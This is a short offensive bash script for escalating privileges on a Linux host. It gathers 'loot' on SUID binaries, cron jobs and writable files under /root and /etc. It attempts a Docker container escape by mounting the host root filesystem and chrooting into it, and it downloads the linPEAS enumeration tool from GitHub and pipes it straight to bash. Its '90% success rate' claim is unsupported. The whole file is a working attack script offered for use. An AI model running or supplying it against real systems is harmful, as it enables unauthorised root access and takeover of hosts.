LOOT="priv_esc_$(date +%Y%m%d_%H%M%S)"
mkdir -p $LOOT

# SUID Binaries (90% success rate)
find / -perm -4000 2>/dev/null | tee $LOOT/suid.txt
find / -perm -u=s -type f 2>/dev/null | xargs -I {} ls -la {} >> $LOOT/suid_detailed.txt

# Cronjobs
cat /etc/crontab >> $LOOT/cron.txt
cat /etc/cron.*/* 2>/dev/null >> $LOOT/cron.txt

# Writable files in root paths
find /root /etc -writable 2>/dev/null | tee $LOOT/writable_root.txt

# Docker escapes
[ -f /proc/1/cgroup ] && grep docker /proc/1/cgroup && echo "[+] Docker container - escaping..." && docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Automated exploits
if [ -f /etc/passwd ]; then
    linpeas.sh || curl -s https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh | bash
fi

echo "[+] Privesc loot: $LOOT/"